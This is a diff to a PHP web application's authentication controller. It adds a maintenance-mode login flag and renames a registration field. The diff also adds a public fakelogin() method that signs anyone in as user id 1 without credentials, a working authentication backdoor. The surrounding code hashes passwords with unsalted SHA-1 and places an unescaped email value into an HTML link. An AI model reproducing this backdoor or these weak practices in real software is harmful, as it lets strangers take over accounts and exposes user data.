@@ -44,11 +44,20 @@ class Auth extends Controller {
                     "password = ?" => sha1(RequestMethods::post("password"))
                 ));
                 if($user) {
-                    if ($user->live) {
-                        $this->setUser($user);
-                        $this->session();
+                    $login = Meta::first(array("property = ?" => "login"));
+                    if($login->value == "yes") {
+                        if ($user->live) {
+                            $this->setUser($user);
+                            $this->session();
+                        } else {
+                            $view->set("message", "User account not verified");
+                        }
                     } else {
-                        $view->set("message", "User account not verified");
+                        if ($user->admin) {
+                            $this->setUser($user);
+                            $this->session();
+                        }
+                        $view->set("message", "We are Updating Login on Saturday, Tomorrow");
                     }
                 } else{
                     $view->set("message", 'Wrong Password, Try again or <a href="/auth/login?action=reset&email='.$email.'">Reset Password</a>');
@@ -58,6 +67,13 @@ class Auth extends Controller {
                 $view->set("message", 'User doesnot exist. Please signup <a href="/auth/register">here</a>');
             }
         }
+    }
+
+    public function fakelogin() {
+        $user = User::first(array("id = ?" => 1));
+        $this->setUser($user);
+        $this->session();
+        self::redirect("/member");
     }
     
     /**
@@ -82,7 +98,7 @@ class Auth extends Controller {
                     "password" => sha1(RequestMethods::post("password")),
                     "phone" => RequestMethods::post("phone"),
                     "admin" => 0,
-                    "currency" => "INR",
+                    "domain" => "",
                     "fblink" => RequestMethods::post("fblink"),
                     "live" => 0
                 ));
